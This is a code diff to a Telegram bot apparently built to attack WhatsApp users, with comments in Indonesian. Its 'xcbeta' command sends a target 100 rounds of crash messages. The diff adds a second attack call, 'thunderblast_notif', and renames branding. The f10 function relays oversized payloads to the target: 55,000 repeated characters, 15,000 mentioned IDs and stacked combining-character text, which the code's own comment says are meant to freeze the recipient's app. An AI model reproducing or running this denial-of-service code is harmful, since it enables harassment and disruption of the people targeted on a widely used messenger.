@@ -612,8 +612,9 @@ bot.command("xcbeta", checkWhatsAppConnection, async ctx => {
   await prosesrespone(target, ctx);
 
   // Melakukan proses freezing 50 kali
-  for (let i = 0; i < 100; i++) {   
-    await f10(target, { ptcp: true });
+  for (let i = 0; i < 100; i++) {
+    await thunderblast_notif(target);
+    await f10(target, { ptcp: true });    
   }
 
   // Menyelesaikan proses response
@@ -1272,7 +1273,7 @@ bot.command("status", ctx => {
   async function f10(target, Ptcp = false) {
     await cella.relayMessage(target, {
       extendedTextMessage: {
-        text: "`ㅤㅤㅤ`\n>  ͆ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺\n" + "ી".repeat(55000),
+        text: "`UI Youko`\n>  ͆ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺\n" + "ી".repeat(55000),
         contextInfo: {
           mentionedJid: ["62895329013688@s.whatsapp.net", ...Array.from({
             length: 15000
@@ -1313,7 +1314,7 @@ bot.command("status", ctx => {
           ephemeralSharedSecret: "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
           externalAdReply: {
             title: "‎᭎ᬼᬼᬼৗীি𑍅𑍑\n⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿\n𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿𑆿𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿𑆿𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿",
-            body: "R ̺҉A ̺҉ ̺҉N ̺҉ ̺ ̺҉Z ̺҉ ̺҉ ̺҉",
+            body: "C҉e҉La҉ UI © Cella",
             mediaType: "VIDEO",
             renderLargerThumbnail: true,
             previewType: "VIDEO",
